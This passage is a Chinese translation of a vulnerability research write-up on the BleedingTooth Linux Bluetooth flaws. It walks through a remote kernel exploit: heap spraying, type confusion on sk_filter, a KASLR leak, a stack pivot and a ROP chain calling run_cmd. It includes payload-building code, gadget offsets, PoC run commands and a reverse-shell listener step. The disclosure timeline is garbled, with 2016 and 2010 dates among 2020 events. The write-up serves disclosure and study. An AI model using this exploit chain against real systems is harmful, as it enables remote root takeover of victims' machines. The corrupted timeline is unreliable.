为了构造 `kmalloc-128 slab` ，我们需要一个可以分配大小在 65-128 字节之间的内存（最好是可控的）的命令。与其他 L2CAP 实现不同，Linux 实现中堆的使用非常低。在 net/bluetooth/ 中快速搜索 `kmalloc()` 或 `kzalloc()` 不会得到任何有用的结果--或者至少没有任何可以控制或跨多个命令存在的东西。我们想要的是一个可以分配任意大小内存的原语，将攻击者控制的数据复制到其中，并保留它，直到我们决定释放它。

这听起来很像 `kmemdup()` ，对吗？令人惊讶的是， A2MP 协议提供给我们的正是这样一个原语。也就是说，我们可以发出 `A2MP_GETAMPASSOC_RSP` 命令来使用 `kmemdup()` 来复制内存，并将内存地址存储在一个控制结构中：

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/a2mp.c
static int a2mp_getampassoc_rsp(struct amp_mgr *mgr, struct sk_buff *skb,
				struct a2mp_cmd *hdr)
{
	...
	u16 len = le16_to_cpu(hdr->len);
	...
	assoc_len = len - sizeof(*rsp);
	...
	ctrl = amp_ctrl_lookup(mgr, rsp->id);
	if (ctrl) {
		u8 *assoc;

		assoc = kmemdup(rsp->amp_assoc, assoc_len, GFP_KERNEL);
		if (!assoc) {
			amp_ctrl_put(ctrl);
			return -ENOMEM;
		}

		ctrl->assoc = assoc;
		ctrl->assoc_len = assoc_len;
		ctrl->assoc_rem_len = assoc_len;
		ctrl->assoc_len_so_far = 0;

		amp_ctrl_put(ctrl);
	}
	...
}
```

为了让 `amp_ctrl_lookup()` 返回一个控制结构，我们必须首先使用 `A2MP_GETINFO_RSP` 命令将它添加到列表中:

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/a2mp.c
static int a2mp_getinfo_rsp(struct amp_mgr *mgr, struct sk_buff *skb,
			    struct a2mp_cmd *hdr)
{
	struct a2mp_info_rsp *rsp = (struct a2mp_info_rsp *) skb->data;
	...
	ctrl = amp_ctrl_add(mgr, rsp->id);
	...
}
```

这几乎是完美的堆原语，因为大小和内容可以是任意的！唯一的缺点是没有方便的原语来释放分配。释放它们的唯一方法似乎是关闭 HCI 连接，这是一个相对缓慢的操作。然而，为了理解如何以一种受控的方式释放分配(例如，释放每一秒的分配以产生漏洞)，我们需要密切关注内存管理。注意，当我们在`ctrl->assoc`中存储一个新的内存地址时，我们不会释放之前存储在那里的内存块。相反，当我们覆盖它时，这个内存块内容会丢失。为了利用这种行为，我们可以每秒钟用不同大小的分配覆盖一次`ctrl->assoc`，一旦我们关闭 HCI 连接，另一半将被释放，而我们覆盖的那些仍然被分配。

## 控制越界读取

为什么我们要用堆原语呢?回想一下，我们的想法是塑造堆并实现一个群，其中我们控制的内存块位于距离结构体`amp_mgr`对象一个块的位置。通过这样做，我们可以控制偏移 0x110 处的值，它表示 `sk_filter`指针。因此，当触发类型混淆时，可以对任意指针解引用。

下面的基本技术在使用了 SLUB 分配器的 Ubuntu 上非常可靠:

- 分配大量128字节大小的对象来填充 `kmalloc-128 slab`。
- 创建一个新的 A2MP 通道，并希望 `struct amp_mgr` 对象与被喷射的对象相邻。
- 触发类型混淆并实现受控的越界读取。

为了验证我们的堆喷射是否成功，我们可以首先查询 `/proc/slabinfo` 来获取受害者机器上的 `kmalloc-128` 的信息:

```shell
$ sudo cat /proc/slabinfo
slabinfo - version: 2.1
# name            <active_objs> <num_objs> <objsize> <objperslab> <pagesperslab> : tunables <limit> <batchcount> <sharedfactor> : slabdata <active_slabs> <num_slabs> <sharedavail>
...
kmalloc-128         1440   1440    128   32    1 : tunables    0    0    0 : slabdata     45     45      0
...
```

然后，在堆喷射之后，我们可以再次查询，发现 `active_objs` 增加了:

```shell
$ sudo cat /proc/slabinfo
...
kmalloc-128         1760   1760    128   32    1 : tunables    0    0    0 : slabdata     55     55      0
...
```

在上面的例子中，我们喷射了 320 个对象。现在，如果我们设法在这些新喷射的对象周围分配 `struct amp_mgr`对象，我们可能会在试图对受控指针(观察RAX的值)进行解引用时遇到一个 panic :

```shell
[   58.881623] general protection fault: 0000 [#1] SMP PTI
[   58.881639] CPU: 3 PID: 568 Comm: kworker/u9:1 Not tainted 5.4.0-48-generic #52-Ubuntu
[   58.881645] Hardware name: Acer Aspire E5-575/Ironman_SK  , BIOS V1.04 04/26/2016
[   58.881705] Workqueue: hci0 hci_rx_work [bluetooth]
[   58.881725] RIP: 0010:sk_filter_trim_cap+0x65/0x220
[   58.881734] Code: 00 00 4c 89 e6 48 89 df e8 b8 c5 af ff 41 89 c5 85 c0 75 62 48 8b 83 10 01 00 00 48 85 c0 74 56 49 8b 4c 24 18 49 89 5c 24 18 <4c> 8b 78 18 48 89 4d b0 41 f6 47 02 08 0f 85 41 01 00 00 0f 1f 44
[   58.881740] RSP: 0018:ffffbbccc10d3ca0 EFLAGS: 00010202
[   58.881748] RAX: 4343434343434343 RBX: ffff96da38f70300 RCX: 0000000000000000
[   58.881753] RDX: 0000000000000000 RSI: ffff96da62388300 RDI: ffff96da38f70300
[   58.881758] RBP: ffffbbccc10d3d00 R08: ffff96da38f67700 R09: ffff96da68003340
[   58.881763] R10: 00000000000301c0 R11: 8075f638da96ffff R12: ffff96da62388300
[   58.881767] R13: 0000000000000000 R14: 0000000000000001 R15: 0000000000000008
[   58.881774] FS:  0000000000000000(0000) GS:ffff96da69380000(0000) knlGS:0000000000000000
[   58.881780] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   58.881785] CR2: 000055f861e4bd20 CR3: 000000024c80a001 CR4: 00000000003606e0
[   58.881790] Call Trace:
[   58.881869]  ? __l2cap_chan_add+0x88/0x1c0 [bluetooth]
[   58.881938]  l2cap_data_rcv+0x351/0x510 [bluetooth]
[   58.881995]  l2cap_data_channel+0x29f/0x470 [bluetooth]
[   58.882054]  l2cap_recv_frame+0xe5/0x300 [bluetooth]
[   58.882067]  ? __switch_to_asm+0x40/0x70
[   58.882124]  l2cap_recv_acldata+0x2d2/0x2e0 [bluetooth]
[   58.882174]  hci_rx_work+0x186/0x360 [bluetooth]
[   58.882187]  process_one_work+0x1eb/0x3b0
[   58.882197]  worker_thread+0x4d/0x400
[   58.882207]  kthread+0x104/0x140
[   58.882215]  ? process_one_work+0x3b0/0x3b0
[   58.882223]  ? kthread_park+0x90/0x90
[   58.882233]  ret_from_fork+0x35/0x40
```

检查受害者机器的 RDI 的内存地址，我们可以看到:

```shell
$ sudo gdb /boot/vmlinuz /proc/kcore
(gdb) x/40gx 0xffff96da38f70300
0xffff96da38f70300:	0xffff96da601e7d00	0xffffffffc0d38760
0xffff96da38f70310:	0xffff96da60de2600	0xffff96da61c13400
0xffff96da38f70320:	0x0000000000000000	0x0000000000000001
0xffff96da38f70330:	0x0000000000000000	0x0000000000000000
0xffff96da38f70340:	0xffff96da38f70340	0xffff96da38f70340
0xffff96da38f70350:	0x0000000000000000	0x0000000000000000
0xffff96da38f70360:	0xffff96da38f70360	0xffff96da38f70360
0xffff96da38f70370:	0x0000000000000000	0x0000000000000000
0xffff96da38f70380:	0xffffffffffffffff	0xffffffffffffffff
0xffff96da38f70390:	0xffffffffffffffff	0xffffffffffffffff
0xffff96da38f703a0:	0xffffffffffffffff	0xffffffffffffffff
0xffff96da38f703b0:	0xffffffffffffffff	0xffffffffffffffff
0xffff96da38f703c0:	0xffffffffffffffff	0xffffffffffffffff
0xffff96da38f703d0:	0xffffffffffffffff	0xffffffffffffffff
0xffff96da38f703e0:	0xffffffffffffffff	0xffffffffffffffff
0xffff96da38f703f0:	0xffffffffffffffff	0xffffffffffffffff
0xffff96da38f70400:	0x4141414141414141	0x4242424242424242
0xffff96da38f70410:	0x4343434343434343	0x4444444444444444
0xffff96da38f70420:	0x4545454545454545	0x4646464646464646
0xffff96da38f70430:	0x4747474747474747	0x4848484848484848
```

0xffff96da38f70410 的值表明 `sk_filter()` 确实试图在 spray 的偏移 0x10 处解除对指针的引用，从`struct amp_mgr`的角度来看，该指针的偏移 0x110 处。Bingo！

## 内存布局泄露

现在，我们有了构造堆的方法，并为 BadKarma 攻击做好准备，因此，我们可以完全控制 `sk_filter` 指针。问题是，我们应该把它指向哪里？为了使该原语有用，我们必须将其指向一个我们可以控制其内容的内存地址。这就是 BadChoice 漏洞发挥作用的地方。这个漏洞有可能暴露内存布局，并帮助我们实现控制地址已知的内存块的目标。

如前所述，为了利用未初始化的堆栈变量 bug ，我们必须首先发送一些不同的命令，用一些有趣的数据填充堆栈帧(例如指向堆的指针或指向与 RO P链相关的 .text 段)。然后，我们可以发送脆弱的命令来接收数据。

通过尝试一些随机的 L2CAP 命令，我们可以观察到，通过在没有任何特殊命令的情况下触发 BadChoice ，一个指向内核映像的 .text 段指针可能会泄露。此外，通过发送 `L2CAP_CONF_RSP` 并尝试提前将 A2MP 通道配置到`L2CAP_MODE_ERTM`，可能会泄露位于偏移量 0x110 的 `struct l2cap_chan` 对象的地址。该对象的大小为 792 字节，在`kmalloc-1024 slab`中分配。

```c
// pahole -E -C l2cap_chan --hex bluetooth.ko
struct l2cap_chan {
	...
	struct delayed_work {
		struct work_struct {
			/* typedef atomic_long_t -> atomic64_t */ struct {
				/* typedef s64 -> __s64 */ long long int counter;        /* 0x110   0x8 */
			} data; /* 0x110   0x8 */
			...
		} work; /* 0x110  0x20 */
		...
	} chan_timer; /* 0x110  0x58 */
	...
	/* size: 792, cachelines: 13, members: 87 */
	/* sum members: 774, holes: 9, sum holes: 18 */
	/* paddings: 4, sum paddings: 16 */
	/* last cacheline: 24 bytes */
};
```

这个对象属于 A2MP 通道，可以通过销毁通道来释放它。这很有用，因为它允许我们应用与 `Use-After-Free` 攻击相同的策略。

考虑以下技巧:

- 泄漏 `struct l2cap_chan` 对象的地址。
- 通过销毁 A2MP 通道释放结构体 `struct l2cap_chan`对象。
- 重新连接 A2MP 通道并将堆原语喷洒到 `kmalloc-1024 slab`上。
- 它可能会回收前一个`struct  l2cap_chan`对象的地址。

换句话说，原来属于`struct l2cap_chan`的地址现在可能属于我们了！同样，使用的技术是非常基础的，但在Ubuntu上使用 SLUB 分配器是非常可靠的。一个担忧的问题是，当重新连接 A2MP 通道时，在堆喷射回收位置之前，`struct l2cap_chan`可能会被新的 `struct l2cap_chan`重新占用。在这种情况下，可以使用多个连接，可以在另一个连接已经关闭的情况下继续喷射。

注意，在 `kmalloc-1024 slab`中分配对象比 `kmalloc-128 slab`中分配对象稍微复杂一些，因为:

- ACL MTU通常小于 1024 字节（可以通过 hciconfig 检查）。
- A2MP 通道的缺省 MTU 为 `L2CAP_A2MP_DEFAULT_MTU=670`字节。

这两个 MTU 限制都很容易绕过。也就是说，我们可以通过将请求分片成多个 L2CAP 报文来绕过 ACL MTU ，也可以通过发送 `L2CAP_CONF_MTU` 响应并配置为 0xffff 字节来绕过 A2MP MTU 。这里，仍然不清楚为什么蓝牙规范不明确的禁止在没有发送请求的情况下解析配置响应。

让我们来试试这个技巧:

```shell
$ gcc -o exploit exploit.c -lbluetooth && sudo ./exploit XX:XX:XX:XX:XX:XX
[*] Opening hci device...
[*] Connecting to victim...
[+] HCI handle: 100
[*] Connecting A2MP channel...
[*] Leaking A2MP kernel stack memory...
[+] Kernel address: ffffffffad2001a4
[+] KASLR offset: 2b600000
[*] Preparing to leak l2cap_chan address...
[*] Leaking A2MP kernel stack memory...
[+] l2cap_chan address: ffff98ee5c62fc00
[*] Spraying kmalloc-1024...
```

请注意这两个泄漏的指针的最重要字节的不同之处。通过观察较大的字节，我们可以进行有根据的猜测（或检查 Linux文档），以确定它们是否属于一个段、堆或堆栈。为了确认我们确实能够收回结构 `l2cap_chan`的地址，我们可以使用以下命令检查受害者机器上的内存:

```shell
$ sudo gdb /boot/vmlinuz /proc/kcore
(gdb) x/40gx 0xffff98ee5c62fc00
0xffff98ee5c62fc00:	0x4141414141414141	0x4242424242424242
0xffff98ee5c62fc10:	0x4343434343434343	0x4444444444444444
0xffff98ee5c62fc20:	0x4545454545454545	0x4646464646464646
0xffff98ee5c62fc30:	0x4747474747474747	0x4848484848484848
...
0xffff98ee5c62fd00:	0x6161616161616161	0x6262626262626262
0xffff98ee5c62fd10:	0x6363636363636363	0x6464646464646464
0xffff98ee5c62fd20:	0x6565656565656565	0x6666666666666666
0xffff98ee5c62fd30:	0x6767676767676767	0x6868686868686868
```

内存内容看起来很有希望！请注意，使用一个模式进行喷射是很有用的，因为这允许我们立即识别内存块，并理解当出现 panic 时，哪些偏移量会被解除引用。

## 把所有东西结合起来

现在我们已经拥有了完成 RCE 所需的全部原语:

- 我们可以控制一个地址已知的内存块(称为“负载”)。
- 我们可以泄漏一个 `.text `段指针，并构建一个 ROP 链，我们可以将其存储在有效负载中。
- 我们可以完全控制 `sk_filter`字段，并将其指向有效负载。

### 实现 RIP 控制 

让我们回顾一下 `sk_filter_trim_cap()`，并理解为什么控制 `sk_filter`是有用的。

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/core/filter.c
int sk_filter_trim_cap(struct sock *sk, struct sk_buff *skb, unsigned int cap)
{
	...
	rcu_read_lock();
	filter = rcu_dereference(sk->sk_filter);
	if (filter) {
		struct sock *save_sk = skb->sk;
		unsigned int pkt_len;

		skb->sk = sk;
		pkt_len = bpf_prog_run_save_cb(filter->prog, skb);
		skb->sk = save_sk;
		err = pkt_len ? pskb_trim(skb, max(cap, pkt_len)) : -EPERM;
	}
	rcu_read_unlock();

	return err;
}
```

由于我们控制 filter 的值，我们还可以通过在负载的偏移 0x18 处放置一个指针来控制 `filter->prog`。也就是说，这是 prog 的偏移量:

```c
// pahole -E -C sk_filter --hex bluetooth.ko
struct sk_filter {
	...
	struct bpf_prog *          prog;                                                 /*  0x18   0x8 */

	/* size: 32, cachelines: 1, members: 3 */
	/* sum members: 28, holes: 1, sum holes: 4 */
	/* forced alignments: 1, forced holes: 1, sum forced holes: 4 */
	/* last cacheline: 32 bytes */
} __attribute__((__aligned__(8)));
```

这里，`struct buf_prog`的结构是:

```c
// pahole -E -C bpf_prog --hex bluetooth.ko
struct bpf_prog {
	...
	unsigned int               (*bpf_func)(const void  *, const struct bpf_insn  *); /*  0x30   0x8 */
	union {
		...
		struct bpf_insn {
			/* typedef __u8 */ unsigned char code;                           /*  0x38   0x1 */
			/* typedef __u8 */ unsigned char dst_reg:4;                      /*  0x39: 0 0x1 */
			/* typedef __u8 */ unsigned char src_reg:4;                      /*  0x39:0x4 0x1 */
			/* typedef __s16 */ short int  off;                              /*  0x3a   0x2 */
			/* typedef __s32 */ int        imm;                              /*  0x3c   0x4 */
		} insnsi[0]; /*  0x38     0 */
	};                                                                               /*  0x38     0 */

	/* size: 56, cachelines: 1, members: 20 */
	/* sum members: 50, holes: 1, sum holes: 4 */
	/* sum bitfield members: 10 bits, bit holes: 1, sum bit holes: 6 bits */
	/* last cacheline: 56 bytes */
};
```

函数`bpf_prog_run_save_cb()`将`filter->prog`传递给`BPF_PROG_RUN()`：

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/filter.h
static inline u32 __bpf_prog_run_save_cb(const struct bpf_prog *prog,
					 struct sk_buff *skb)
{
	...
	res = BPF_PROG_RUN(prog, skb);
	...
	return res;
}

static inline u32 bpf_prog_run_save_cb(const struct bpf_prog *prog,
				       struct sk_buff *skb)
{
	u32 res;

	migrate_disable();
	res = __bpf_prog_run_save_cb(prog, skb);
	migrate_enable();
	return res;
}
```

然后调用`bpf_dispatcher_nop_func()`，参数为`ctx`，` prog->insnsi`和 `prog->bpf_func()`：

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/filter.h
#define __BPF_PROG_RUN(prog, ctx, dfunc)	({			\
	u32 ret;							\
	cant_migrate();							\
	if (static_branch_unlikely(&bpf_stats_enabled_key)) {		\
		...
		ret = dfunc(ctx, (prog)->insnsi, (prog)->bpf_func);	\
		...
	} else {							\
		ret = dfunc(ctx, (prog)->insnsi, (prog)->bpf_func);	\
	}								\
	ret; })

#define BPF_PROG_RUN(prog, ctx)						\
	__BPF_PROG_RUN(prog, ctx, bpf_dispatcher_nop_func)
```

最后，调度程序使用`ctx`和`prog->insnsi`作为参数调用 `prog->bpf_func()`处理程序:

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/bpf.h
static __always_inline unsigned int bpf_dispatcher_nop_func(
	const void *ctx,
	const struct bpf_insn *insnsi,
	unsigned int (*bpf_func)(const void *,
				 const struct bpf_insn *))
{
	return bpf_func(ctx, insnsi);
}
```

总之，我们有:

```c
sk->sk_filter->prog->bpf_func(skb, sk->sk_filter->prog->insnsi);
```

因为我们可以控制`sk->sk_filter`，所以我们也可以控制后面的两个解引用。这最终给了我们 RIP 控制， RSI 寄存器（第二个参数）指向我们的有效载荷。

### 内核堆栈旋转

由于现在的 CPU 有 NX ，所以不可能直接执行 shell 代码。但是，我们可以执行代码重用攻击，如 ROP/JOP 。当然，为了重用代码，我们必须知道它位于何处，这就是为什么 KASLR 绕过是必不可少的。对于可能的攻击， ROP 通常比 JOP 更容易执行，但这需要我们重定向堆栈指针 RSP 。因此，利用开发人员通常执行 JOP 来堆栈 pivot ，然后以 ROP 链结束。

我们的想法是将堆栈指针重定向到由 ROP gadgets  (即ROP链)组成的负载中的假堆栈。因为我们知道 RSI 指向我们的有效载荷，所以我们想把 RSI 的值移到 RSP 。让我们看看是否有一个 gadgets  可以让我们这样做。

要提取 gadgets ，我们可以使用以下工具:

- [extract-vmlinux](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/scripts/extract-vmlinux) 解压 `./boot/vmlinuz`
- [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) 从 `vmlinux` 提取 ROP gadgets。

寻找像 `mov rsp, X ; ret` 这样的 gadgets，我们可以看到，它们没有一个是有用的。

```c
$ cat gadgets.txt | grep ": mov rsp.*ret"
0xffffffff8109410c : mov rsp, qword ptr [rip + 0x15bb0fd] ; pop rbx ; pop rbp ; ret
0xffffffff810940c2 : mov rsp, qword ptr [rsp] ; pop rbp ; ret
0xffffffff8108ef0c : mov rsp, rbp ; pop rbp ; ret
```

也许会有一些像 `push rsi ; pop rsp ; ret` 这样的？

```c
$ cat gadgets.txt | grep ": push rsi.*pop rsp.*ret"
0xffffffff81567f46 : push rsi ; adc al, 0x57 ; add byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret
0xffffffff8156a128 : push rsi ; add byte ptr [rbx + 0x41], bl ; pop rsp ; pop r13 ; pop rbp ; ret
0xffffffff81556cad : push rsi ; add byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret
0xffffffff81c02ab5 : push rsi ; lcall [rbx + 0x41] ; pop rsp ; pop rbp ; ret
0xffffffff8105e049 : push rsi ; sbb byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret
0xffffffff81993887 : push rsi ; xchg eax, ecx ; lcall [rbx + 0x41] ; pop rsp ; pop r13 ; pop rbp ; ret
```

太好了，有很多 gadgets 可以用。有趣的是，所有 gadgets 都解引用 RBX+0x41 ，这很可能是常用指令或指令序列的一部分。具体来说，由于指令在 x86 中可以从任何字节开始，因此它们可以根据开始字节位置进行不同的解释。RBX+0x41的解引用实际上可能会阻碍我们使用 gadgets ——也就是说，如果 RBX 在执行 `bpf_func()`时不包含可写内存地址，我们就会在执行 ROP 链之前陷入 painc 。在我们的例子中，幸运的是，RBX 指向结构`amp_mgr`对象，并且如果偏移量 0x41 处的字节被更改，就不会有问题。

当选择 `stack pivot gadget`作为 `bpf_func()` 的函数指针并触发它时， RSI 的值将被压入栈中，然后从栈中弹出，最后赋值给 RSP 。换句话说，堆栈指针将指向我们的有效负载，一旦 RET 指令被执行，我们的 ROP 链将启动。

```c
static void build_payload(uint8_t data[0x400]) {
  // Fake sk_filter object starting at offset 0x300.
  *(uint64_t *)&data[0x318] = l2cap_chan_addr + 0x320;  // prog

  // Fake bpf_prog object starting at offset 0x320.
  // RBX points to the amp_mgr object.
  *(uint64_t *)&data[0x350] =
      kaslr_offset +
      PUSH_RSI_ADD_BYTE_PTR_RBX_41_BL_POP_RSP_POP_RBP_RET;  // bpf_func
  *(uint64_t *)&data[0x358] = 0xDEADBEEF;                   // rbp

  // Build kernel ROP chain that executes run_cmd() from kernel/reboot.c.
  // Note that when executing the ROP chain, the data below in memory will be
  // overwritten. Therefore, the argument should be located after the ROP chain.
  build_krop_chain((uint64_t *)&data[0x360], l2cap_chan_addr + 0x3c0);
  strncpy(&data[0x3c0], remote_command, 0x40);
}
```

有了这些，我们终于实现了RCE。为了调试我们的 `stack pivot` 并看看我们是否成功，我们可以设置`(uint64_t)&data[0x360]=0x41414141`并观察一个可控的 painc 。

### 内核ROP链执行

现在，我们可以编写一个大的 ROP 链来检索和执行 C 负载，也可以编写一个小的 ROP 链来运行任意命令。为了进行 POC 证明，我们已经满足于使用反向 shell 的条件,因此执行一个命令就足够了。受 [CVE-2019-18683: Exploiting a Linux kernel vulnerability in the V4L2 subsystem](https://a13xp0p0v.github.io/2020/02/15/CVE-2019-18683.html) （利用 Linux 中的 V4L2 子系统内核漏洞）中描述的ROP链的启发我们将构建一个链，用 `/bin/bash -c /bin/bash`之后，蓝牙将不再工作。在更复杂的攻击中，我们将继续执行。

为了确定两种方法的偏移量，我们可以简单地检查受害者机器上留存的符号:

```shell
$ sudo cat /proc/kallsyms | grep "run_cmd\|do_task_dead"
ffffffffab2ce470 t run_cmd
ffffffffab2dc260 T do_task_dead
```

这里，KASLR slide 的值是 0x2a200000 ，可以通过对 `_text`符号 进行 grep 并减去 0xffffffff81000000 来计算得到：

```shell
$ sudo cat /proc/kallsyms | grep "T _text"
ffffffffab200000 T _text

ab2ce470
2a200000
```

前两个地址的减去 slide 得到:

```c
#define RUN_CMD 0xffffffff810ce470
#define DO_TASK_DEAD 0xffffffff810dc260
```

最后，我们可以用 ROPgadge 找到 `pop rax ; ret`，`pop rdi ; ret` 和 `jmp rax` 等 gadgets，然后我们可以根据下面的例子来构造内核ROP链：

```c
static void build_krop_chain(uint64_t *rop, uint64_t cmd_addr) {
  *rop++ = kaslr_offset + POP_RAX_RET;
  *rop++ = kaslr_offset + RUN_CMD;
  *rop++ = kaslr_offset + POP_RDI_RET;
  *rop++ = cmd_addr;
  *rop++ = kaslr_offset + JMP_RAX;
  *rop++ = kaslr_offset + POP_RAX_RET;
  *rop++ = kaslr_offset + DO_TASK_DEAD;
  *rop++ = kaslr_offset + JMP_RAX;
}
```

这个 ROP 链应该放在伪结构 `bpf_prog`对象中的偏移量 0x40 处，而 `cmd_addr`应该指向放置在内核内存中的 bash 命令。一切准备就绪，最终我们可以从受害者那里获取到一个 root shell 。

# POC

获取 POC： https://github.com/google/security-research/tree/master/pocs/linux/bleedingtooth.

编译使用:

```c
$ gcc -o exploit exploit.c -lbluetooth
```

然后执行为:

```c
$ sudo ./exploit target_mac source_ip source_port
```

在另一个终端中，运行:

```c
$ nc -lvp 1337
exec bash -i 2>&0 1>&0
```

如果成功执行，会弹出一个 calc ：

```shell
export XAUTHORITY=/run/user/1000/gdm/Xauthority
export DISPLAY=:0
gnome-calculator
```

受害者偶尔可能会在 dmesg 中打印：Bluetooth: Trailing bytes: 6 in sframe。如果`kmalloc-128 slab`喷射没有成功，就会发生这种情况。在这种情况下，我们需要崇训利用 EXP 。关于“BadKarma”这个漏洞的一个趣闻，BadKarma 漏洞偶尔会在 `sk_filter()`的提前退出，例如当字段`sk_filter`为 0 时，继续执行 A2MP 接收处理程序并发送回一个 A2MP 响应包。有意思的是，当这种情况发生时，受害者的机器并没有发生 painc ——相反，攻击者的机器会 panic；因为，正如我们之前了解到的，A2MP 协议使用的 ERTM 实现在设计上会引发类型混淆。

# 时间线

2020-07-06 - 谷歌内部发现 BadVibes 漏洞

2016-07-20 - 谷歌内部发现 BadKarma 和 BadChoice 漏洞

2010-07-22 - Linus Torvalds 报告独立发现 BlueZ 的 BadVibes 漏洞，公布时间为7天

2020-07-24 - [BlueZ 主要开发人员](http://www.bluez.org/development/credits/)（Intel）报告的三个 BleedingTooth 漏洞的技术细节

2020-07-29 - Intel 在 2020-07-31 与谷歌预约了会议

2020-07-30 - BadVibes 发布修复补丁

2020-07-31 - Intel 将披露日期定在 2020-09-01，此前由 Intel 协调发布了一份保密协议。通知方通过 kconfig 给出一个非安全性提交消息来禁用 BT_HS 

2020-08-12 - Intel 调整披露日期至 2020-10-13 (自初始报告起90天)

2020-09-25 - Intel 提交补丁到 公开的 [bluetooth-next](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/net/bluetooth?id=f19425641cb2572a33cb074d5e30283720bd4d22) 分支 

2020-09-29 - 补丁与 [5.10 linux-next](https://git.kernel.org/pub/scm/linux/kernel/git/next/linux-next.git/commit/net/bluetooth?id=2bd056f550808eaa2c34a14169c99f81ead083a7) 分支合并

2020-10-13 - 公开披露英特尔的建议，随后披露谷歌建议

2020-10-14 - Intel 将推荐的固定版本从 5.9 修正到 5.10 内核

2020-10-15 - Intel 取消内核升级建议

# 结论

从零知识开始，到发现蓝牙 HCI 协议中的三个漏洞，这是一个即奇怪又出乎意料的过程。当我第一次发现 BadVibes 漏洞时，我认为它只会被脆弱/恶意的蓝牙芯片触发，因为这个漏洞看起来太明显了。由于我没有两个带蓝牙 5 的可编程设备，我无法验证是否有可能收到这么大的报文。只有在比较了 Linux 蓝牙栈与其他实现并阅读了规范之后，我才得出结论，我确实是发现了我的第一个 RCE 漏洞，并立即出去购买了另一台笔记本电脑(令人惊讶的是，市场上没有值得信赖的 BT5 适配器)。分析溢出后，很快就发现需要一个额外的信息泄漏漏洞。比我想象的要快得多，我只花了两天时间就发现了 BadChoice 。在尝试触发它时，我发现了 BadKarma 漏洞，我最初认为这是一个会阻止 BadChoice 漏洞的 bug。事实证明，绕过这个漏洞是相当容易的，而且这个漏洞实际上是另一个高度严重的安全漏洞。研究 Linux 蓝牙栈和开发 RCE 漏洞具有挑战性，但令人兴奋，特别是因为这是我第一次审计和调试 Linux 内核。我很高兴，这项工作的结果是，决定在[默认情况下禁用蓝牙高速特性](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/net/bluetooth?id=b176dd0ef6afcb3bca24f41d78b0d0b731ec2d08)下以减少攻击面，这也意味着删除强大的堆原语。此外，我将从这项研究中获得的知识转化为 [syzkaller contributions](https://github.com/google/syzkaller/commits?author=TheOfficialFloW)，它使 /dev/vhci 设备能被Fuzz ，并发现了>40个额外的bug。虽然这些 bug 多数不太可能被利用，甚至不太可能被远程触发，但它们会被工程师识别和修复其他弱点（[Bluetooth: Fix null pointer dereference in hci_event_packet()](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=b50dc237ac04d499ad4f3a92632470a9eb844f7d), [Bluetooth: Fix memory leak in read_adv_mon_features()](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=cafd472a10ff3bccd8afd25a69f20a491cd8d7b8) 或 [Bluetooth: Fix slab-out-of-bounds read in hci_extended_inquiry_result_evt()](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=51c19bf3d5cfaa66571e4b88ba2a6f6295311101)，因此有助于拥有一个更安全、更稳定的内核。

# 致谢

Dirk Göhmann
Eduardo Vela
Francis Perron
Jann Horn